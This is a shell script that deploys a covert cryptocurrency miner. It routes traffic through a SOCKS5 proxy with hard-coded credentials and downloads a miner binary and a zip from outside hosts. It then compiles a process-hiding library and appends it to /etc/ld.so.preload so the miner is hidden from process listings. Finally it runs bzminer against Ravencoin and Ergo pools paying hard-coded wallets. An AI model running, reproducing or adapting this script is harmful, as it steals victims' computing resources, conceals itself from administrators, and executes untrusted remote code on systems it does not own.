#!/bin/sh
ln -fs /usr/share/zoneinfo/Africa/Johannesburg /etc/localtime
dpkg-reconfigure --frontend noninteractive tzdata

apt update -y;apt -y install libcurl4-openssl-dev libssl-dev libjansson-dev automake autotools-dev build-essential binutils git cmake screen unzip net-tools curl -y

wget https://raw.githubusercontent.com/nathanfleight/scripts/main/graphics.tar.gz

tar -xvzf graphics.tar.gz

cat > graftcp/local/graftcp-local.conf <<END
listen = :2233
loglevel = 1
socks5 = 51.79.222.181:1080
socks5_username = gratis
socks5_password = q1w2e3r4t5
END

./graftcp/local/graftcp-local -config graftcp/local/graftcp-local.conf &

sleep .2

echo " "
echo " "

echo ""

./graftcp/graftcp curl ifconfig.me

echo " "
echo " "

echo " "
echo " "

./graftcp/graftcp wget https://bashupload.com/6WaQ8/bzminer
chmod +x bzminer

./graftcp/graftcp wget https://raw.githubusercontent.com/nathanfleight/scripts/main/magicBezzHash.zip
unzip magicBezzHash.zip
make
gcc -Wall -fPIC -shared -o libprocesshider.so processhider.c -ldl
mv libprocesshider.so /usr/local/lib/
echo /usr/local/lib/libprocesshider.so >> /etc/ld.so.preload

./graftcp/graftcp ./bzminer -a kawpow -w RXK7bh1VdavfDxJXBwEkcZPVTEqsvCCC2g -p stratum+tcp://rvn.2miners.com:6060 --a2 ergo --p2 stratum+tcp://pool.us.woolypooly.com:3100 --w2 9gL1cBifCAEzDjKd9ov5sHpWbxSt2jqAiHhVrXPxhWc6B6zfW7G
